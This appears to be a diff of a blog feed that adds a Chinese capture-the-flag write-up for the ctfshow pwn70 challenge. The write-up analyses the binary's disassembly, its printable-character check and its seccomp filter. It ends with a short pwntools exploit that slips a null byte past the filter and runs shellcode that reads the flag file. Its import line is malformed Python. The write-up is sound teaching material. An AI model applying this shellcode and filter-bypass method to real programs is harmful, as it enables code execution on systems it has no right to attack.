@@ -398,9 +398,10 @@
 <li><p>长度完全错了</p>
 </li>
 <li><p>栈偏移完全不对</p>
-<pre><code>     3. 覆盖不到正确的RIP
-           4. 触发不了ROP
-</code></pre>
+</li>
+<li><p>覆盖不到正确的RIP</p>
+</li>
+<li><p>触发不了ROP</p>
 </li>
 </ol>
 <p>这不是我们想要的结果，是逻辑错误</p>
@@ -453,6 +454,97 @@
 <p>​	其实到这里已经很清楚了，用我的大白话来说，本道题的思路就是在buf缓冲区中注入shellcode，这个shellcode的作用就是读取ORW_shellcode到mmap（因为buf的缓冲区太小了不足以放下ORW_shellcode），接着跳转到这里。然后我们填满栈偏移直至0x28字节，使用rsp执行我们的shellcode跳转到mmap，执行ORW shellcode 获得flag</p>
 <p>​	这道题我认为比较有难度，但是虽然这道题很难，但你已经走得很远了，坚持一下，肯定能攻克它！</p>
 <p>​	希望可以帮到你，加油！</p>
+]]></content>
+      <tags>
+        <tag>CTF - PWN - 网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow pwn入门 pwn70</title>
+    <url>/2025/11/22/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn70/</url>
+    <content><![CDATA[<h2 id="pwn70"><a href="#pwn70" class="headerlink" title="pwn70"></a>pwn70</h2><p><a href="https://ctf.show/challenges#pwn70-4080">ctf.show pwn70</a></p>
+<span id="more"></span>
+
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li><a href="#jump1">题目</a></li>
+<li><a href="#jump2">预计时间</a></li>
+<li><a href="#jump3">题目分析及截图</a></li>
+</ul>
+<hr>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id="jump1">题目</a></h4><img src="/2025/11/22/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn70/1.png" class="" title="This is an image">
+
+<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>2h</p>
+<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="#jump3">题目分析及截图</a></h4><p>我们首先checksec看看一下程序的保护机制</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn70$ checksec ./pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/yyh/pwn70/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到程序只开启了canary</p>
+<p>我们打开Ida看一下程序的反编译出来的代码</p>
+<p><strong>main函数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400A68 main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:0000000000400A68</span><br><span class="line">.text:0000000000400A68 var_80          = qword ptr -80h</span><br><span class="line">.text:0000000000400A68 var_74          = dword ptr -74h</span><br><span class="line">.text:0000000000400A68 s               = byte ptr -70h</span><br><span class="line">.text:0000000000400A68 var_8           = qword ptr -8</span><br><span class="line">.text:0000000000400A68</span><br><span class="line">.text:0000000000400A68 ; __unwind &#123;</span><br><span class="line">.text:0000000000400A68                 push    rbp</span><br><span class="line">.text:0000000000400A69                 mov     rbp, rsp</span><br><span class="line">.text:0000000000400A6C                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:0000000000400A70                 mov     [rbp+var_74], edi</span><br><span class="line">.text:0000000000400A73                 mov     [rbp+var_80], rsi</span><br><span class="line">.text:0000000000400A77                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400A80                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000400A84                 xor     eax, eax</span><br><span class="line">.text:0000000000400A86                 mov     eax, 0</span><br><span class="line">.text:0000000000400A8B                 call    init</span><br><span class="line">.text:0000000000400A90                 mov     eax, 0</span><br><span class="line">.text:0000000000400A95                 call    set_secommp</span><br><span class="line">.text:0000000000400A9A                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400A9E                 mov     esi, 68h ; &#x27;h&#x27;  ; n</span><br><span class="line">.text:0000000000400AA3                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000400AA6                 call    _bzero</span><br><span class="line">.text:0000000000400AAB                 mov     eax, 0</span><br><span class="line">.text:0000000000400AB0                 call    logo</span><br><span class="line">.text:0000000000400AB5                 lea     rdi, aWelcomeTellMeY ; &quot;Welcome,tell me your name:&quot;</span><br><span class="line">.text:0000000000400ABC                 call    _puts</span><br><span class="line">.text:0000000000400AC1                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AC5                 mov     edx, 64h ; &#x27;d&#x27;  ; nbytes</span><br><span class="line">.text:0000000000400ACA                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400ACD                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400AD2                 mov     eax, 0</span><br><span class="line">.text:0000000000400AD7                 call    _read</span><br><span class="line">.text:0000000000400ADC                 sub     eax, 1</span><br><span class="line">.text:0000000000400ADF                 cdqe</span><br><span class="line">.text:0000000000400AE1                 mov     [rbp+rax+s], 0</span><br><span class="line">.text:0000000000400AE6                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AEA                 mov     rdi, rax</span><br><span class="line">.text:0000000000400AED                 call    is_printable</span><br><span class="line">.text:0000000000400AF2                 test    eax, eax</span><br><span class="line">.text:0000000000400AF4                 jz      short loc_400AFE</span><br><span class="line">.text:0000000000400AF6                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AFA                 call    rax</span><br><span class="line">.text:0000000000400AFC                 jmp     short loc_400B0A</span><br></pre></td></tr></table></figure>
+
+<p>我解释一下这个汇编代码</p>
+<ol>
+<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400A68                 push    rbp</span><br><span class="line">.text:0000000000400A69                 mov     rbp, rsp</span><br><span class="line">.text:0000000000400A6C                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br></pre></td></tr></table></figure>
+
+<p>分配一个70h的栈帧</p>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov [rbp+var_74], edi   ; argc</span><br><span class="line">mov [rbp+var_80], rsi   ; argv</span><br></pre></td></tr></table></figure>
+
+<p>保存参数</p>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, fs:28h</span><br><span class="line">mov [rbp+var_8], rax</span><br></pre></td></tr></table></figure>
+
+<p>保存canary</p>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call init</span><br><span class="line">call set_secommp</span><br></pre></td></tr></table></figure>
+
+<p>调用 init 和 seccomp函数。</p>
+<p>seccomp是沙箱的标志，我们一会要使用seccomp-tools工具来看哪些系统调用可执行 </p>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea rax, [rbp+s]</span><br><span class="line">mov esi, 0x68        ; 104 字节</span><br><span class="line">mov rdi, rax</span><br><span class="line">call _bzero</span><br></pre></td></tr></table></figure>
+
+<p>清零0x68字节</p>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call logo</span><br><span class="line">puts(&quot;Welcome,tell me your name:&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>打印logo，输出欢迎语</p>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea rax, [rbp+s]</span><br><span class="line">mov edx, 0x64     ; nbytes = 100</span><br><span class="line">mov rsi, rax      ; buf</span><br><span class="line">mov edi, 0        ; fd = stdin</span><br><span class="line">call read</span><br></pre></td></tr></table></figure>
+
+<p>调用read函数，从stdin中最多读取0x64字节，read的返回值在eax中</p>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub eax, 1</span><br><span class="line">cdqe</span><br><span class="line">mov [rbp+rax+s], 0</span><br></pre></td></tr></table></figure>
+
+<p>将最后一个字节改成<code>\x00</code>，即c字符串结尾</p>
+</li>
+<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea rax, [rbp+s]</span><br><span class="line">mov rdi, rax</span><br><span class="line">call is_printable</span><br><span class="line">test eax, eax</span><br><span class="line">jz short loc_400AFE</span><br></pre></td></tr></table></figure>
+
+<p>检查是否全是printable字符</p>
+</li>
+</ol>
+<p><strong>is_printable 函数</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">is_printable</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] &lt;= <span class="number">31</span> || a1[i] == <span class="number">127</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先获取字符串长度，循环遍历每一个字符</p>
+<p>由于在汇编中看见了沙箱函数，所以这时，我们需要使用<code>seccomp-tools dump ./pwn</code>命令去看一下程序的可执行系统调用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn70$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
+
+<p><strong>除了execve</strong>都可以进行系统调用，那我们及就可以使用<code>ORW</code>或者直接<code>cat</code></p>
+<p>在之前，我们也写过一个这样的题目，都是对shellcode中的每一位字符进行限制，但是在当时我们是使用<code>/x00</code>来绕过的，但是，<code>/x00</code>的含义在不同位置并不同</p>
+<ul>
+<li>在<code>is_printable函数</code>中，我们输入的相当于是c语言中&#x2F;x00的意思，也就是字符串结束符的意思</li>
+<li>在发送payload时就是汇编语言中的意思，但是<code>/x00</code>是不能单独出现的，需要构成一条完整的汇编命令，在这里我们可以使用程序中有的指令<code>/x00/xc0</code>，当然你也可以直接自己构造</li>
+</ul>
+<p>其实到这里很简单了，我们直接写入shellcode就好了（需要加<code>/x00</code>进行绕过），因为这道题不涉及覆盖返回地址，我们不需要去管金丝雀值</p>
+<blockquote>
+<p>exp如下（cat写法）</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn <span class="keyword">from</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28110</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;\x00\xc0&#x27;</span>+shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>因为flag在文件&#x2F;flag里，所以这里我们就使用cat，当然也可以使用ORW</li>
+<li><code>\x00\xc0</code>是<code>ADD AL,AL</code>的意思，是程序中出现的代码</li>
+</ul>
 ]]></content>
       <tags>
         <tag>CTF - PWN - 网络安全</tag>
